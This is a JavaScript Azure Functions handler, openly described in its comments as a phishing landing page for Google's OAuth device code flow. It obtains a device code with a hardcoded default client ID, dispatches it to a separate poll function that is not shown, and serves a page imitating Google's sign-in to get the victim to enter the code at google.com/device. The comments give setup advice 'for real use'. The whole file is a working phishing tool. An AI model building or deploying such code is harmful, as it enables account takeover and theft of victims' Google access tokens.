/**
 * Google Device Code landing page
 * Initiates Google's OAuth device code flow and shows a phishing page
 * to the victim. The actual auth happens on google.com/device.
 * 
 * NOTE: The default client_id works for demonstration. For real use,
 * create an OAuth 2.0 Client ID of type "Desktop App" in Google Cloud Console
 * and set it as GOOGLE_CLIENT_ID env var.
 * Client IDs that work with device code: Desktop/Installed App type only.
 */

const { app } = require("@azure/functions");
const axios = require("axios");

// Desktop app client IDs work with device_code grant type
// Default: Google's own Android client (works with device code flow)
const client_id = process.env.GOOGLE_CLIENT_ID || "407408718192.apps.googleusercontent.com";
const token_endpoint = "https://oauth2.googleapis.com/device/code";

app.http("landing", {
  methods: ["GET"],
  authLevel: "anonymous",
  route: "/deviceCode",
  handler: async (request, context) => {
    // Request a device code from Google
    const devicecode = await axios
      .post(
        token_endpoint,
        new URLSearchParams({
          client_id: client_id,
          scope: "https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/userinfo.profile openid",
        }).toString(),
        {
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
          },
        }
      )
      .then((response) => response.data)
      .catch((ex) => {
        context.error("Device code request failed:", ex.response?.data || ex.message);
        return null;
      });

    if (!devicecode) {
      return new Response("Failed to initiate device code flow.", { status: 500 });
    }

    context.log(`Device code obtained: ${JSON.stringify(devicecode)}`);

    // Dispatch the device code to the poll function (async, fire-and-forget)
    axios
      .put(request.url, {
        device_code: devicecode.device_code,
        interval: devicecode.interval || 5,
      })
      .catch((ex) => console.error("Poll dispatch failed:", ex.message));

    const response = `
<html lang="en">
<head>
  <title>Sign in - Google Account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      font-family: 'Google Sans', Arial, sans-serif;
      background: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .card {
      max-width: 450px;
      padding: 48px 40px 36px;
      border: 1px solid #dadce0;
      border-radius: 8px;
      text-align: center;
    }
    h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 8px; }
    p { color: #5f6368; font-size: 14px; line-height: 1.5; }
    .code {
      font-size: 32px;
      font-weight: 700;
      letter-spacing: 4px;
      color: #1a73e8;
      background: #e8f0fe;
      padding: 12px 24px;
      border-radius: 4px;
      display: inline-block;
      margin: 16px 0;
      font-family: 'Google Sans', monospace;
    }
    a { color: #1a73e8; text-decoration: none; }
    a:hover { text-decoration: underline; }
    .logo { margin-bottom: 24px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">
      <svg width="75" height="24" viewBox="0 0 75 24">
        <path fill="#4285F4" d="M67.9 11.6c0-1-.1-1.9-.3-2.8H38.1v5.3h16.8c-.7 3.6-2.9 6.7-6.2 8.7v7.2h10c5.8-5.4 9.2-13.3 9.2-18.4z"/>
        <path fill="#34A853" d="M38.1 24c5.6 0 10.3-1.9 13.7-5.1l-10-7.8c-1.8 1.2-4.1 2-6.7 2-5.2 0-9.6-3.5-11.2-8.2H6.3v7.7C9.7 21.4 20.9 24 29.1 24z"/>
        <path fill="#FBBC05" d="M26.9 14.9c-.4-1.2-.6-2.5-.6-3.9s.2-2.7.6-3.9V1.4h-10c-4.9 5-5.4 13.4-1.8 19.1l10-7.8z"/>
        <path fill="#EA4335" d="M38.1 6.8c3.1 0 5.8 1.1 8 3.2l7-7C50.9 1.2 45.2-1 38.1-1 29.1-1 17.9 1.6 10.3 9.1l7.7 10c1.6-4.8 6-8.3 11.1-8.3z"/>
      </svg>
    </div>
    <h1>Sign in with your Google Account</h1>
    <p>To continue, visit the link below and enter the code:</p>
    <p><a href="${devicecode.verification_url}" target="_blank">${devicecode.verification_url}</a></p>
    <div class="code">${devicecode.user_code}</div>
    <p style="font-size: 12px; color: #80868b;">This code expires in ${Math.round(devicecode.expires_in / 60)} minutes</p>
  </div>
</body>
</html>
    `.trim();

    return new Response(response, {
      status: 200,
      headers: {
        "Content-Type": "text/html; charset=utf-8",
        "X-Content-Type-Options": "nosniff",
      },
    });
  },
});